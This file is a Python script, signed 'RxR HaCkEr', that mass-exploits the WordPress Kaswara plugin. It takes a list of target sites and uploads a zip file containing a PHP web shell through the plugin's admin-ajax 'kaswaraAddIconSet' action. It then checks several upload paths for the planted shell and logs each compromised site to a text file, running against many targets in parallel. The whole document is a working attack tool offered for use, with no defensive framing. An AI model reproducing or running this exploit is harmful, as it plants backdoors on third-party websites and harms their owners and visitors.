import sys , requests, re , socket 
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 

init(autoreset=True)

fr  =   Fore.RED
fg  =   Fore.GREEN


requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')




headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
# Coded By RxR HaCkEr




banner = '''{}
           
______       ______   _   _         _____  _     _____           
| ___ \     | ___ \ | | | |       /  __ \| |   |  ___|         
| |_/ /__  __| |_/ / | |_| |  __ _ | /  \/| | __| |__  _ __   
|    / \ \/ /|    /  |  _  | / _` || |    | |/ /|  __|| '__|  
| |\ \ >  < | |\ \ | | | || (_| || \__/\|   < | |___| |     
\_| \_|/_/\_\\_| \_| \_| |_/ \__,_| \____/|_|\_\\____/|_|       


Coded By: RxR HaCkEr Telegram:t.me/CodeRxR , Skype:a.789a    

\n'''.format(fr)
print banner


			


def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    if site[-1]  is not '/' :
        site = site+'/'
    return site

def domain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    if 'www.' in site :
        site = site.replace("www.", "")
    site = site.rstrip()
    if site.split('/') :
        site = site.split('/')[0]
    while site[-1] == "/":
        pattern = re.compile('(.*)/')
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site



def exploit(url) :
    try :
			dom = domain(url)
			url = URLdomain(url)
			if 'www.' in url:
				username = url.replace('www.', '')
			else:
				username = url
			if '.' in username:
				username = username.split('.')[0]
			if 'http://' in username:
				username = username.replace('http://', '')
			else:
				username = username.replace('https://', '')
			up=username.title()


			data = {'action':'kaswaraAddIconSet','iconSetName':'1337rxr'}
			files = {'iconSetFile':open('king_zip.zip','rb')}
			r = requests.post(url+"/wp-admin/admin-ajax.php", data=data,files=files,headers=headers)
			dirpath = ['/wp-content/uploads/kaswara/fonts_icon/1337rxr/king_zip/rxr.php','/wp-content/uploads/kaswara/icons/1337rxr/king_zip/rxr.php','/wp-content/uploads/kaswara/icons/1337rxr/king_zip/rxr.php','/wp-content/uploads/kaswara/fonts_icon/1337rxr/king_zip/rxr.php']
			for dirctors in dirpath:
				injctons = url + dirctors
				checker = requests.get(injctons, headers=headers)
				if 'RxR HaCkEr' in checker.content:
					print('[Target:] {} >> {}Success eXplotinG ').format(url,fg)
					open('Shell_kaswara.txt', 'a').write(injctons + "\n")
				else:
					print('[Target:] {} >> {}Not Vulin ').format(url,fr)

    except :
       print('Target:{}  --> {}[Failed]').format(url,fr)

mp = Pool(120)
mp.map(exploit, target)
mp.close()
mp.join()
